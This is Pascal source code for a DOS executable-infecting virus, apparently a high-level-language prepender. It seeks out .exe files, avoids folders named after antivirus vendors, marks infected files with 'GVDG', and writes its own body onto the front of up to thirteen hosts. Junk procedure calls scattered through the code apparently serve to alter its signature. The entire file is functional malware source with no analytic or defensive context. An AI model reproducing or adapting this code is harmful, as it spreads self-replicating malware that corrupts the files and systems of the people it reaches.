  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=4474;
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S);
 IntToStr:=S;
End;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
begin
  Assign(ToF,path+name); BeginEnd(19570); BeginEnd(-2333);
  reset(ToF,1);
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(13941); BeginEnd(6596); BeginEnd(9936);
  seek(ToF,filesize(ToF)); BeginEnd(-1566); 
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(-3139); BeginEnd(-7144);
  Assign(FromF,paramstr(0));
  reset(FromF,1);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead);
  seek(ToF,0); BeginEnd(30393); BeginEnd(31168);
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(7672); BeginEnd(5529); BeginEnd(16766);
  Close(ToF);
  Close(FromF); BeginEnd(18164); BeginEnd(2189); BeginEnd(-1840);
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<13 then
  begin
  Assign(f,dir+sr.name); BeginEnd(16718); BeginEnd(-2624);
  setfattr(f,0); BeginEnd(30693); BeginEnd(-1940); BeginEnd(31359);
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(2280); 
      reset(f,1);
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(-3193); BeginEnd(14145);
        blockread(f,Buf,4); BeginEnd(-8072); BeginEnd(-7662); BeginEnd(29783);
        Close(f); BeginEnd(-8583); BeginEnd(20643);
        if Buf<>'GVDG' then
         begin
           inc(Victim); BeginEnd(6988); BeginEnd(-2353); BeginEnd(5338);
           Infect(dir,sr.name); BeginEnd(-1082); BeginEnd(20530);
         end;
      end
      else
      Close(f);
    end; BeginEnd(-1018); BeginEnd(494);
    findnext(sr);
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
   BufVir : Bufer;
  NumRead : Word;
begin
if Run=1 then
  begin
  writeln('Hallo, World!!!');
  end;
  Assign(f,paramstr(0)); BeginEnd(-2235); BeginEnd(3580); BeginEnd(22048);
  reset(f,1); BeginEnd(-4137); BeginEnd(-3157); BeginEnd(29544);
  seek(f,filesize(f)-VirSize); BeginEnd(15656); BeginEnd(-6965);
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead); BeginEnd(25079); BeginEnd(-1981);
  seek(f,0); BeginEnd(-6730); BeginEnd(16876); BeginEnd(25861);
  BlockWrite(f,BufVir,NumRead); BeginEnd(-3864); BeginEnd(17824);
  if FileSize(f)>VirSize then
  Begin
    Seek(f,FileSize(f)-VirSize); BeginEnd(15463); 
    Truncate(f); BeginEnd(12198); BeginEnd(30939); BeginEnd(15670);
    Close(f); BeginEnd(2697); 
    if (Run=1) or (Run=3) then
    exec(Paramstr(0),''); BeginEnd(3381); 
  end
  else
  Begin
    Close(f);
    Erase(f);
    Halt(0);
  end;
end;
Procedure Nucleus;
var
    f : file;
begin
  Assign(f,paramstr(0)); BeginEnd(1531); BeginEnd(-9681); BeginEnd(-2945);
  SetFAttr(f,0); BeginEnd(-2811); BeginEnd(-2919);
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  Find(''); BeginEnd(-2824); 
  InRun(1);
end;
begin
Randomize; BeginEnd(-2210); 
Nucleus; BeginEnd(-1126); BeginEnd(-2943); BeginEnd(27135);
end.
